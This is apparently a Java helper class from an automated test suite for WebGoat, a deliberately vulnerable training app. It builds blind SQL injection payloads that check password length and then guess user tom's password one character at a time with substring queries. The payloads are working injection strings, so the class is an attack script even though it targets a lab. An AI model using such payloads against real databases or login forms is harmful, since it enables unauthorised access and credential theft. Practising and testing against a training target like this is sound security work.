package webgoat.puerto.iplocal.models;

import net.thucydides.core.annotations.Step;
import webgoat.puerto.iplocal.pageObjects.MainPageObject;
import webgoat.puerto.iplocal.pageObjects.SQLAdvancedPageObject;


import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class QueryIteration {
    int iterator=0;
    int j=-1;
    int i=1;
    private String password="";
    private String alphabet = "abcdefghijklmnopqrstuvwxyz";

    public String QueriesProcess(int value, boolean flag) {

        if (value == 0) {
            iterator+=5;
            return "tom' and length(password) >= " + iterator + "--";
        }
        else if(value == 1) {
            iterator-=1;
            return "tom' and length(password) = " + iterator + "--";
        }

        j+=1;
        if(flag){

            password= password+alphabet.charAt(j-1);
            i=i+1;
            j=0;
            System.out.println(password);
            if(i>iterator){
                return null;
            }

            return "tom' and substring(password," + i + ",1)='"+ alphabet.charAt(j) + "'--";
        }

        return "tom' and substring(password," + i + ",1)='"+ alphabet.charAt(j) + "'--";
    }
        public String getPassword() {
        return password;
    }
}
